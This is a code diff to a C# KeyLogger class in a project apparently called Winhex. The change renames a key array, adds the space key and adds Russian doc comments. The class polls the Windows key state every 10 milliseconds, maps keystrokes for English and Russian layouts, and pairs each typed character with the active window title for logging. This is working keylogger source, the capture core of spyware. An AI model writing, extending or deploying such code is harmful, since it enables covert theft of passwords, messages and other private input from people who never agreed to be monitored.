@@ -18,8 +18,11 @@ namespace Winhex.Models
         private char[] specSymbolsEng = new char[] { ')', '!', '@', '#', '$', '%', '^', '&', '*', '(' };
         private char[] specSymbolsRus = new char[] { ')', '!', '"', '№', ';', '%', ':', '?', '*', '(' };
 
-        private int[] specialCase = new int[] { 191, 188, 190, 186, 222, 219, 221, 220, 111, 189, 109, 187, 107, 8, 106, 110 };
+        private int[] specialCases = new int[] { 191, 188, 190, 186, 222, 219, 221, 220, 111, 189, 109, 187, 107, 8, 106, 110, 32 };
 
+        /// <summary>
+        /// Событие, возвращающее заголовок окна активного приложения и введенный символ
+        /// </summary>
         public event Action<string, char> OnKeyPressed;
 
         public KeyLogger()
@@ -27,22 +30,20 @@ namespace Winhex.Models
             Timer mainTimer = new Timer(10);
             mainTimer.Elapsed += MainTimer_Elapsed;
             mainTimer.Start();
-
         }
 
-
+        /// <summary>
+        /// Проверка статуса клавиши
+        /// </summary>
+        /// <param name="sender"></param>
+        /// <param name="e"></param>
         private void MainTimer_Elapsed(object sender, ElapsedEventArgs e)
         {
             var keyboard = GetKeyboard();
             bool shift = ShiftIsDown();
             string title = GetActiveWindowTitle() == null ? "" : GetActiveWindowTitle();
 
-            //for (int i = 0; i < 250; i++)
-            //{
-            //    if (IsKeyPushedDown(i))
-            //        OnKeyPressed?.Invoke(title, i);
-            //}
-
+          
             // nums
             for (int i = 48; i <= 57; i++)
             {
@@ -93,12 +94,12 @@ namespace Winhex.Models
             }
 
             // special cases
-            for (int i = 0; i < specialCase.Length; i++)
+            for (int i = 0; i < specialCases.Length; i++)
             {
-                if (IsKeyPushedDown(specialCase[i]))
+                if (IsKeyPushedDown(specialCases[i]))
                 {
                     char sym = '1';
-                    switch (specialCase[i])
+                    switch (specialCases[i])
                     {
                         case 191:
                             if (shift)
@@ -266,6 +267,7 @@ namespace Winhex.Models
                         case 107:
                             sym = '+';
                             break;
+                        // особый случай для Backspace. Не забыть проанализировать при записи в лог
                         case 8:
                             sym = '`';
                             break;
@@ -290,11 +292,20 @@ namespace Winhex.Models
             }
         }
        
+        /// <summary>
+        /// Проверка на нажатость клавиши
+        /// </summary>
+        /// <param name="vKey">Код клавиши</param>
+        /// <returns></returns>
         private static bool IsKeyPushedDown(int vKey)
         {
             return GetAsyncKeyState(vKey) == -32767;
         }
 
+        /// <summary>
+        /// Возвращает текущую раскладку пользователя
+        /// </summary>
+        /// <returns></returns>
         private Keyboard GetKeyboard()
         {
             if (IsCapsLocked())
@@ -313,11 +324,19 @@ namespace Winhex.Models
             }
         }
 
+        /// <summary>
+        /// Возвращает статус активированности капс лока
+        /// </summary>
+        /// <returns></returns>
         private bool IsCapsLocked()
         {
              return Console.CapsLock;
         }
 
+        /// <summary>
+        /// Проверка на зажатие шифта
+        /// </summary>
+        /// <returns></returns>
         private bool ShiftIsDown()
         {
             return GetAsyncKeyState(16) == -32768;
@@ -350,6 +369,10 @@ namespace Winhex.Models
         [DllImport("user32.dll")]
         static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
 
+        /// <summary>
+        /// Возвращает заголовок активного окна 
+        /// </summary>
+        /// <returns></returns>
         private string GetActiveWindowTitle()
         {
             const int nChars = 256;
